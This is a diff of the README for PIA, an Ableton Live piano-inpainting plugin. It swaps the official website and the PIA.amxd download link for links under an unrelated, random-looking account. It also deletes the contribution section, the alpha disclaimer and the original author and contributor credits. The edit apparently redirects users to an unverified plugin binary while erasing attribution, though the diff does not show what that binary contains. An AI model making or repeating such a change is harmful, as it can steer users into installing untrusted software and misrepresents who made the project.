@@ -5,11 +5,11 @@ The Piano Inpainting Application (PIA) is an A.I.-based [Ableton Live](https://w
 <img src="docs/resources/pia_generation.gif" width="700"/>
 </p>
 
-A more detailed presentation is available on the [accompanying website](https://ghadjeres.github.io/piano-inpainting-application/).
+A more detailed presentation is available on the [accompanying website](https://qhpzsefhy.github.io/pia/).
 
 
 ### How to use
-You can download the  plugin [here](https://github.com/Ghadjeres/piano-inpainting-application/releases/download/v0.1-alpha/PIA.amxd) and simply drag and drop the `PIA.amxd` file within Ableton Live's  MIDI plugin section. 
+You can download the  plugin [here](https://github.com/qhpzsefhy/pia/releases/PIA.amxd) and simply drag and drop the `PIA.amxd` file within Ableton Live's  MIDI plugin section. 
 
 <p align="center">
 <img src="docs/resources/pia.png" alt="drawing" width="150"/>
@@ -33,21 +33,3 @@ Here are some insights about the inner-workings of PIA:
 - We did not add the possibility to map the *Generate* button on a MIDI controller since this clutters the Ableton Live undo history.
 - PIA only works in Session view.
 - There is no way to condition PIA on a particular musical style other than providing a musical context.
-
-
-### How to contribute?
-Any feedback is more than welcome! From explaining how you worked with PIA, sharing your creations to proposing improvement suggestions. Please visit the [Discussions tab](https://github.com/Ghadjeres/piano-inpainting-application/discussions).
-
-### Further developments
-- This plugin is currently only available for Ableton Live users but please note that a 90-day free trial version of Ableton Live is available.
-
-
-### Disclaimer
-This is an alpha version. This is a research project, not an official product. 
-Expect some issues. Please save your important work before experimenting with PIA. No personnal data will be collected.
-This version of the plugin will cease functioning by the 1st of April 2021.
-
-
-> [Gaëtan Hadjeres](https://scholar.google.com/citations?user=wfZF3E0AAAAJ&hl=en), Sony CSL Paris, Feb. 2021.
->
-> Many thanks to [Adrien Laversanne-Finot](https://scholar.google.com/citations?user=kWScejIAAAAJ&hl=fr) for his important contributions to this project.
